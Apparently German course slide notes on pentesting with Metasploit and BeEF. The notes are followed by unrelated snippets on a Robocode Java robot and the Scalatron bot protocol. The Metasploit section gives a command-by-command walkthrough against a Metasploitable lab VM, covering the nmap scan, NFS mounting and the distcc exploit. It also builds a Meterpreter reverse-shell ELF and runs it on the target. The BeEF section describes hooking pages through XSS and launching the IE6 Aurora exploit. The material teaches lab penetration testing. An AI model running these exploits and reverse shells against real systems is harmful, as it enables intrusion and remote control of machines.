Metasploit

Umfassendes Pentesting und Exploit Tool

Ursprungsidee: Exploits werden aus Komponenten kombiniert:

  • Der eigentliche Exploit
  • Payload (was ausgeführt wird)
  • Obfuscation, IDS prevention, etc.

...das ganze modular und einfach erweiterbar.

Metasploit

Gewachsen zu einem umfassenden Pentesting-Tool:

  • Verwaltung von Payload-Verbindungen (Meterpreter Shells)
  • „Tunneln“ von Metasploit durch einen gePWNten Rechner (Pivoting)
  • Integration diverser Tools (Scanner, Fuzzer)
  • Protokollierungsmöglichkeiten
  • Uvm.

Scan und Exploit von Metasploitable
  • msfconsole
  • db_nmap -sS -A -p 0-65535 -T4 192.168.56.103 → nmap mit host detection, agressive (fast)
  • hosts → Host ist in der DB eingetragen
  • services → Ergebnis des Scans
  • search nfs → nach Modulen suchen, die mit nfs zu tun haben
  • user auxiliary/scanner/nfs/nfsmount → nfs-Scanner
  • show options → Parameter des Moduls
  • set RHOSTS 192.168.56.103 → Zielhost setzen
  • run → Starten. Oh, der Host exportiert NFS schreibbar :-)
  • An der Konsole: Temporäres Verzeichnis anlegen; mounten: mount -t nfs 192.168.56.103:/ /mnt/tmp
  • search distcc
  • use exploit/unix/misc/distcc_exec
  • show options
  • show targets
  • show payloads
  • exploit
  • ctrl-z → session in background
  • Konsole: msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=12345 R | msfencode -t elf -o revshell
  • Konsole: base64 revshell → Ausgabe in Zwischenablage
  • use exploit/multi/handler
  • set payload linux/x86/meterpreter/reverse_tcp
  • set LHOST 192.168.1.101
  • set LPORT 12345
  • exploit -j
  • sessions -i 2 → Session zurückholen
  • echo (base64-Ausgabe) | base64 -d > revshell
  • chmod +x revshell
  • ./revshell

BeEF: Browser Exploitation Framework

Webanwendung: Liefert „Hook“ und Management-Konsole aus

Hook auf fremde Seite „einbauen“ (XSS, modifizierte Webseite, etc.)

Modular aufgebaut, einfach erweiterbar

Skriptbar über REST-API

  • BeEF in Backtrack: /pentest/web/beef
  • Alte beef.db löschen (vorherige Sessions)
  • Metasploit-Integration aktivieren: config.yaml extension/metasploit/enable
  • Metasploit-Extension konfigurieren: extensions/metasploit/config.yaml, Passwort, host und callback_host setzen
  • Metasploit starten (msfconsole), BeEF-RPC laden: load msgrpc ServerHost=remote-shell-ip Pass=abc123
  • Aurora-Exploit gegen IE6:
    • Metasploit: use exploit/multi/handler; set LPORT 4444
    • BeEF: Metasploit/Internet Explorer Aurora; Payload: windows/meterpreter/reverse_tcp; EXITFUNC: process

public class MyFirstRobot extends Robot {
  @Override
  public void run() {
    setAdjustRadarForGunTurn(false);
    while (true) {
      turnGunLeft(10.0);
    }
  }

  @Override
  public void onScannedRobot(ScannedRobotEvent event) {
    fire(1.0);
  }
}

Scalatron

Kommunikation mit Textprotokoll: 

Command(key=value,...)|Command(...)|...

Kommandos:

  • Move(direction=dx:dy)
  • Spawn(direction=dx:dy,name=string,energy=int,...)
  • Set(key=value,...) (werden mit React mitübergeben)
  • Explode(size=int) (nur Mini-Bots)
  • „Debugging-Tools” Log, Say, Status, MarkCell, ...
